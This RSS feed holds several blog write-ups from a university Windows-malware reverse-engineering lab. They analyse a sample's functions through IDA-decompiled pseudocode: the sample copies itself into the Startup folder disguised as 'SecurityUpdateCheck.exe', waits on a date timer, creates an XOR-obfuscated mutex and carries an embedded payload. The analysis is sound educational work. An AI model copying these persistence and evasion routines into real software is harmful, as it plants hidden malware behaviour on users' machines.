<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Site</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/</link><description>Recent content on SBK Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x162023-lab---winmalware---sub_140001c80/</guid><description>&lt;h1 id="simple-reverse---0x162023-lab---winmalware---sub_140001c80">
 Simple Reverse - 0x16(2023 Lab - WinMalware - sub_140001C80)
 &lt;a class="anchor" href="#simple-reverse---0x162023-lab---winmalware---sub_140001c80">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001C80 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234.001}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea">GetModuleFileNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-getusernamea">GetUserNameA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-copyfilea">CopyFileA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/fileapi/nf-fileapi-setfileattributesa">SetFileAttributesA&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Main Function
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Sleep(&lt;span style="color:#ae81ff">0x1B7740u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001C80();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001030();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001120();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001BF0();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sub_140001C80
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>DWORD &lt;span style="color:#a6e22e">sub_140001C80&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DWORD result; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> size_t v1; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD v2; &lt;span style="color:#75715e">// [rsp+20h] [rbp-258h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>lpNewFileName; &lt;span style="color:#75715e">// [rsp+28h] [rbp-250h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> DWORD pcbBuffer[&lt;span style="color:#ae81ff">4&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-248h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Buffer[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+40h] [rbp-238h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Filename[&lt;span style="color:#ae81ff">272&lt;/span>]; &lt;span style="color:#75715e">// [rsp+150h] [rbp-128h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetModuleFileNameA(&lt;span style="color:#ae81ff">0&lt;/span>i64, Filename, &lt;span style="color:#ae81ff">0x104u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">=&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> GetUserNameA(Buffer, pcbBuffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( __CFADD__(pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>], v2 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">const&lt;/span> CHAR &lt;span style="color:#f92672">*&lt;/span>)malloc(v1);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sub_140001350(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lpNewFileName,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v2 &lt;span style="color:#f92672">+&lt;/span> pcbBuffer[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;C:&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Users&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">AppData&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Roaming&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Microsoft&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Windows&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Start Menu&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Programs&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">Startup&lt;/span>&lt;span style="color:#ae81ff">\\&lt;/span>&lt;span style="color:#e6db74">SecurityUpdateCheck.exe&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Buffer);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> CopyFileA(Filename, lpNewFileName, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> SetFileAttributesA(lpNewFileName, &lt;span style="color:#ae81ff">0x26u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA sub_14001C80(解析版)&lt;/p></description></item><item><title>Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x172023-lab---winmalware---sub_140001030/</guid><description>&lt;h1 id="simple-reverse---0x172023-lab---winmalware---sub_140001030">
 Simple Reverse - 0x17(2023 Lab - WinMalware - sub_140001030)
 &lt;a class="anchor" href="#simple-reverse---0x172023-lab---winmalware---sub_140001030">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001030 在做什麼，並找出其行為所對應的 MITRE ATT&amp;amp;CK technique ID。
Flag format: FLAG{T1234}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/timezoneapi/nf-timezoneapi-systemtimetofiletime">SystemTimeToFileTime&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createwaitabletimerw">CreateWaitableTimerW&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-setwaitabletimer">SetWaitableTimer&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject">WaitForSingleObject&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001030
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">waitUntil20231118&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE Result; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> HANDLE hTimer; &lt;span style="color:#75715e">// [rsp+30h] [rbp-38h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> SYSTEMTIME SystemTime; &lt;span style="color:#75715e">// [rsp+38h] [rbp-30h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> &lt;span style="color:#a6e22e">_FILETIME&lt;/span> FileTime; &lt;span style="color:#75715e">// [rsp+48h] [rbp-20h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> LARGE_INTEGER DueTime; &lt;span style="color:#75715e">// [rsp+50h] [rbp-18h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wYear &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">2023&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMonth &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">11&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDay &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">18&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wDayOfWeek &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wHour &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMinute &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wSecond &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> SystemTime.wMilliseconds &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SystemTimeToFileTime(&lt;span style="color:#f92672">&amp;amp;&lt;/span>SystemTime, &lt;span style="color:#f92672">&amp;amp;&lt;/span>FileTime);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> DueTime &lt;span style="color:#f92672">=&lt;/span> FileTime;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Result &lt;span style="color:#f92672">=&lt;/span> CreateWaitableTimerW(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hTimer &lt;span style="color:#f92672">=&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> SetWaitableTimer(Result, &lt;span style="color:#f92672">&amp;amp;&lt;/span>DueTime, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( Result )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(Result) &lt;span style="color:#f92672">=&lt;/span> WaitForSingleObject(hTimer, &lt;span style="color:#ae81ff">0xFFFFFFFF&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> Result;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>攻擊者的完整意圖&lt;/p></description></item><item><title>Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x182023-lab---winmalware---sub_140001120/</guid><description>&lt;h1 id="simple-reverse---0x182023-lab---winmalware---sub_140001120">
 Simple Reverse - 0x18(2023 Lab - WinMalware - sub_140001120)
 &lt;a class="anchor" href="#simple-reverse---0x182023-lab---winmalware---sub_140001120">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>分析 eductf-lab.exe 中的 function sub_140001120 在做什麼，並找出其所建立的 Mutex 的名稱。
Flag format: FLAG{mutex_name}&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/synchapi/nf-synchapi-createmutexa">CreateMutexA&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/sync/using-mutex-objects">使用 Mutex 物件&lt;/a>
&lt;blockquote>
&lt;p>可以使用 mutex 物件 來保護共用資源，避免多個執行緒或進程同時存取。 每個執行緒都必須等候 mutex 的擁有權，才能執行可存取共用資源的程式碼。 例如，如果數個執行緒共用資料庫的存取權，執行緒可以使用 mutex 物件一次只允許一個執行緒寫入資料庫。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/debug/system-error-codes--0-499-">系統錯誤碼 (0-499)&lt;/a>
&lt;blockquote>
&lt;p>ERROR_ALREADY_EXISTS
183 (0xB7)
無法建立檔案，該檔案已存在。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001120
:::spoiler IDA Source Code
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">sub_140001120&lt;/span>()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{ 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> HANDLE MutexA; &lt;span style="color:#75715e">// rax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+20h] [rbp-78h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v3[&lt;span style="color:#ae81ff">2&lt;/span>]; &lt;span style="color:#75715e">// [rsp+30h] [rbp-68h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> CHAR Name[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+38h] [rbp-60h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v5[&lt;span style="color:#ae81ff">32&lt;/span>]; &lt;span style="color:#75715e">// [rsp+58h] [rbp-40h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v3[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1684234874&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> qmemcpy(v5, &lt;span style="color:#f92672">&amp;amp;&lt;/span>unk_140003348, &lt;span style="color:#ae81ff">0x1Du&lt;/span>i64);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>; &lt;span style="color:#f92672">++&lt;/span>i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Name[i] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(v3 &lt;span style="color:#f92672">+&lt;/span> i &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>) &lt;span style="color:#f92672">^&lt;/span> v5[i];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MutexA &lt;span style="color:#f92672">=&lt;/span> CreateMutexA(&lt;span style="color:#ae81ff">0&lt;/span>i64, &lt;span style="color:#ae81ff">1&lt;/span>, Name);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> LODWORD(MutexA) &lt;span style="color:#f92672">=&lt;/span> GetLastError();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( MutexA &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">183&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> MutexA;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>:::&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有個小地方要注意，雖然觀察過source code是非常簡單的建立mutex的操作，題目想要知道的mutex name也非常簡單，只是個xor就知道的東西，不過在實作上需要注意endian的問題，一開始我是直接按照&lt;code>0x64, 0x63, 0x62, 0x7A&lt;/code>的順序，但結果輸出一些ascii的字元，其實他是從後面讀進來再開始操作xor&lt;/p></description></item><item><title>Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload/</guid><description>&lt;h1 id="simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">
 Simple Reverse - 0x19(2023 Lab - WinMalware - Extract Next Stage Payload)
 &lt;a class="anchor" href="#simple-reverse---0x192023-lab---winmalware---extract-next-stage-payload">#&lt;/a>
&lt;/h1>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;blockquote>
&lt;p>取出 eductf-lab.exe 中的 next stage payload (embedded PE file)，並計算其 MD5 hash。
Flag format: FLAG{462fe0000&amp;hellip;} (hex character must be lowercase)&lt;/p>&lt;/blockquote>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>DOS Header
&lt;img src="https://hackmd.io/_uploads/HJ9P9gpfp.png" alt="" />&lt;/li>
&lt;li>NT Headers - Optional Header
&lt;img src="https://hackmd.io/_uploads/SkjNqeazT.png" alt="" />&lt;/li>
&lt;/ul>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>sub_140001870
:::spoiler IDA Source Code解析前
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">__int64&lt;/span> &lt;span style="color:#66d9ef">__fastcall&lt;/span> &lt;span style="color:#a6e22e">sub_140001870&lt;/span>(&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>pe_file, _QWORD &lt;span style="color:#f92672">*&lt;/span>pe_file_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file &lt;span style="color:#f92672">=&lt;/span> byte_140005040;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>pe_file_size &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">72770&lt;/span>i64; &lt;span style="color:#75715e">// 這是個是怎麼判斷成PE size我也不知道
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">**&lt;/span>pe_file &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>ZM&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( &lt;span style="color:#f92672">*&lt;/span>(sub_1400013D0(&lt;span style="color:#f92672">*&lt;/span>pe_file) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x18&lt;/span>) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x20B&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>i64;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
